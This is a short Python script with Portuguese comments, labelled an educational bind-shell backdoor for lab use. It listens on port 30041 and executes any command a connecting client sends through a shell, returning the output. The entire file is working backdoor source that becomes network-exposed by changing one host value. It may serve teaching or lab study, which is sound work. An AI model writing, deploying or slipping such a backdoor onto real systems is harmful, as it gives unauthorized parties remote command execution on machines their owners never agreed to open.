#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Backdoor educacional (bind shell) - Segurança da Informação.

Abre a porta 30041, aceita uma conexão e executa os comandos recebidos,
devolvendo a saída. Uso restrito a laboratório / máquina própria.
"""

import socket
import subprocess

HOST = "127.0.0.1"   # "0.0.0.0" exporia na rede toda: usar apenas em lab isolado
PORT = 30041
BUFFER = 65536


def executar(comando: str) -> str:
    resultado = subprocess.run(
        comando, shell=True, capture_output=True, text=True, timeout=30
    )
    saida = resultado.stdout + resultado.stderr
    return saida or "[sem saída]\n"


def atender(conexao: socket.socket) -> None:
    conexao.sendall(b"Backdoor conectado. Digite 'sair' para encerrar.\n")
    while True:
        conexao.sendall(b"backdoor> ")
        dados = conexao.recv(BUFFER)
        if not dados:
            break
        comando = dados.decode(errors="ignore").strip()
        if not comando:
            continue
        if comando.lower() in ("sair", "exit", "quit"):
            break
        try:
            resposta = executar(comando)
        except Exception as erro:
            resposta = f"[erro]: {erro}\n"
        conexao.sendall(resposta.encode(errors="ignore"))


def abrir_porta() -> socket.socket:
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    servidor.bind((HOST, PORT))
    servidor.listen(1)
    return servidor


def main() -> None:
    servidor = abrir_porta()
    print(f"[+] Escutando em {HOST}:{PORT} (Ctrl+C para sair)")
    try:
        while True:
            conexao, endereco = servidor.accept()
            print(f"[+] Conexão de {endereco[0]}:{endereco[1]}")
            with conexao:
                atender(conexao)
            print("[+] Sessão encerrada.")
    except KeyboardInterrupt:
        print("\n[!] Encerrando.")
    finally:
        servidor.close()


if __name__ == "__main__":
    main()
